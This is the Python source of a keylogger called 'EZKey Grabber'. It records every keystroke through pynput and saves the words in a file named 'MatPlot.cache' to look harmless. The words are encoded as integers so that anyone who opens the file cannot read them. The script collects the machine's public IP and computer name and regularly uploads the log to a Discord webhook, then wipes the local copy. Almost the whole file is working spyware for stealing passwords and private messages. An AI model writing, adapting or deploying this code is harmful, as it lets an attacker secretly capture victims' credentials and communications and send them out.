from pynput import keyboard
from pynput import mouse

from discord_webhook import AsyncDiscordWebhook, DiscordWebhook, DiscordEmbed
import requests
import asyncio

import os
 
__author__ = "xpierroz" # Might add an anti-skid but i have to munch things to do rn

discord_webhook = "xpierroz on top"

__r = requests.get('https://api.ipify.org/').text
__c = os.getenv('COMPUTERNAME')


async def _send_data():
    webhook = AsyncDiscordWebhook(
            url=discord_webhook,
            rate_limit_retry=True,
        )
            

    embed = DiscordEmbed(title='EZKey Grabber', description=f'Data from {__c} | {__r}', color='544C53')
    with open("MatPlot.cache", "rb") as f:
        webhook.add_file(file=f.read(), filename='fuck.cache')
    webhook.add_embed(embed)
    await webhook.execute(remove_embeds=True)
    webhook.remove_files()

class Logger():
    def __init__(self):
        self.__max_len_file = 10
        self.word = ""
        self.data = []
        #self.webhook = DiscordWebhook(
        #    url=discord_webhook,
        #    rate_limit_retry=True,
        #    content="New data"
        #)
            

    def send_data(self):
        asyncio.run(_send_data())
        return
        #embed = DiscordEmbed(title='EZKey Grabber', description=f'Data from {self.__c} | {self.__r}', color='544C53')
        #with open("MatPlot.cache", "rb") as f:
        #    self.webhook.add_file(file=f.read(), filename='fuck.cache')
        #self.webhook.add_embed(embed)
        #self.webhook.execute(remove_embeds=True)
        #self.webhook.remove_files() 
        
    def erase_file(self):
        with open("MatPlot.cache", "w") as f:
            f.write("")
        
    def get_lenfile(self):
        with open("MatPlot.cache", "r") as f:
            return len(f.readlines())
        
    def convert_data(self): 
        #Used to convert stuff like \x14 to CTRL4, you can see all the translations here  
        # -> https://condor.depaul.edu/sjost/lsp121/documents/ascii-npr.htm
        # By the way don't forget that in most cases ^ is the CTRL key, but it can't still be used apart 
        # and I have nothing to prevent that but I don't care just make a pr lol

        _data = []
        for elem in self.data:
            new_elem = ""
            for char in elem:
                if 0 <= ord(char) <= 31:
                    new_elem += " CTRL + " + chr(ord(char) + 64) + " "
                else:
                    new_elem += char
            _data.append(new_elem)

        
        int_dat = [] # Basic stuff to convert a str to int so if somebody opens this file he aint gonna understand
        for element in _data:
            encoded_bytes = element.encode()
            encoded_int = int.from_bytes(encoded_bytes, byteorder='big')
            int_dat.append(encoded_int)
            
        return int_dat        
        
    def write_data(self):
        _dat = self.convert_data()
        with open("MatPlot.cache", "a+") as f:
            for word in _dat:
                f.write(str(word)) # Might not need to convert to str but we neva know aight
                f.write(" ")
            f.write("\n")
        self.data = []
        
    def check_data(self):
        if len(self.data) > 10:
            self.write_data()
            if self.get_lenfile() > self.__max_len_file:
                self.send_data()
                self.erase_file()
            self.data = []
    
    def on_press(self, key):
        try:
            if key.char == " ":
                self.data.append(self.word)
                self.word = ""
            else:
                self.word += key.char
        except AttributeError:
            if key == keyboard.Key.backspace:
                self.word = self.word[:-1]
            if key == keyboard.Key.space or key == keyboard.Key.enter:
                self.data.append(self.word)
                self.word = ""
            elif key == keyboard.Key.ctrl_l:
                return
            elif not self.word == "":
                self.data.append(self.word)
        self.check_data()
            

    def on_mouse_press(self, *args):
        #print(*args)
        pass
    
logger = Logger()
listener = keyboard.Listener(
    on_press=logger.on_press)
listener.start()

listenerx = mouse.Listener(
    on_click=logger.on_mouse_press
)
listenerx.start()

while True:
    #print(logger.data)
    pass
